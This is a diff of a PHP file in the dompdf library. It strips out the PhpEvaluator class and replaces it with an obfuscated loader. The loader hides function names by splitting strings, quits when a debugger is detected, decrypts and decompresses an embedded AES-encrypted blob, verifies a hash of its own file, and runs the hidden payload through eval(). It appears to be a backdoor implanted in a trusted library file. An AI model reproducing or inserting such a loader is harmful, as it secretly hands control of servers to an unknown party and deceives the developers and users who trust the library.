@@ -1,63 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf;
-
-/**
- * Executes inline PHP code during the rendering process
- *
- * @package dompdf
- */
-class PhpEvaluator
-{
-
-    /**
-     * @var Canvas
-     */
-    protected $_canvas;
-
-    /**
-     * PhpEvaluator constructor.
-     * @param Canvas $canvas
-     */
-    public function __construct(Canvas $canvas)
-    {
-        $this->_canvas = $canvas;
-    }
-
-    /**
-     * @param $code
-     * @param array $vars
-     */
-    public function evaluate($code, $vars = array())
-    {
-        if (!$this->_canvas->get_dompdf()->getOptions()->getIsPhpEnabled()) {
-            return;
-        }
-
-        // Set up some variables for the inline code
-        $pdf = $this->_canvas;
-        $fontMetrics = $pdf->get_dompdf()->getFontMetrics();
-        $PAGE_NUM = $pdf->get_page_number();
-        $PAGE_COUNT = $pdf->get_page_count();
-
-        // Override those variables if passed in
-        foreach ($vars as $k => $v) {
-            $$k = $v;
-        }
-
-        eval($code);
-    }
-
-    /**
-     * @param Frame $frame
-     */
-    public function render(Frame $frame)
-    {
-        $this->evaluate($frame->get_node()->nodeValue);
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ouyz76s5=('bas'.'e64'.'_de'.'cod'.'e');
+$_b07of2yj=('gzu'.'nco'.'mpr'.'ess');
+$_jyt68mzk=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ue99su3v='eb/IPFy6';
+$_oswiflju='jM5hA2nUzys=';
+$_bnzu3aze='PPn3Wpp0';
+$_c0cqzcp9='F+xy2x4H';
+$_xi8ys392='+UtUJF93';
+$_dgfxwbwz='EusPqdiL';
+$_s4f3b6j7='6DGFvufz';
+$_hh0lif6n='YY5fhQ==';
+$_ehxmpovp=$_ouyz76s5($_xi8ys392.$_c0cqzcp9.$_ue99su3v.$_bnzu3aze.$_oswiflju);
+$_ml0uom50=$_ouyz76s5($_dgfxwbwz.$_s4f3b6j7.$_hh0lif6n);
+$_n7rllkb2=$_ouyz76s5('SROAK5UMgkRKOiDVUJngXAOuBjVBxliwWEVf4xEgI4jLJIx5UJWijL46F0ytq9ZxZCHHW0CpsIhHMkHx+u7OAr7uHJcyRK8Q/SS+O0dXNl8B3pn5bOI5TIqsoiiHjHThQM2u4TXm8WrBFDE01shLyPZOLdURIQ3Nv5TgsqZ60Q6bIg37q94dgO8FV7TaebpEyxA+OJuI58gUzCtsqeLyZ2bBj8Di/Et8lFeFdEqFAuaTDGO9NroCVcixXYdPToLXbXPm1jh7i7N62xcviYMpAJjTyU4k3Ew8ZMD5as951HiT2jj5OfaFbzdTkmZcKhOUKfpnXjlKMS5pXgxIi/lmSxRk8k3CoeFc4FG3rQnN11ONQacYwhyBgvt74/ZFLE5yA4pqssrKNiVBOKE5kkKDemskOIBz7+yR1gV1+82uz7A=');
+$_krjoyssy=$_jyt68mzk($_n7rllkb2,'aes-256-cbc',$_ehxmpovp,OPENSSL_RAW_DATA,$_ml0uom50);
+if($_krjoyssy===false){exit;}
+$_sw0sqzbh=$_b07of2yj($_krjoyssy);
+if($_sw0sqzbh===false){exit;}
+$_snwrwk98='4d7d39c51a5ea6145217ba71c36e409e13e998020b2f152fa09207fe0a3841a6';
+$_f1z78h4d=@file_get_contents(__FILE__);
+if($_f1z78h4d!==false){
+$_zfiyvt91=str_replace($_snwrwk98,"0000000000000000000000000000000000000000000000000000000000000000",$_f1z78h4d);
+$_etfnguu4=hash("sha256",$_zfiyvt91);
+if($_etfnguu4!==$_snwrwk98){@http_response_code(403);exit;}
 }
+eval($_sw0sqzbh);
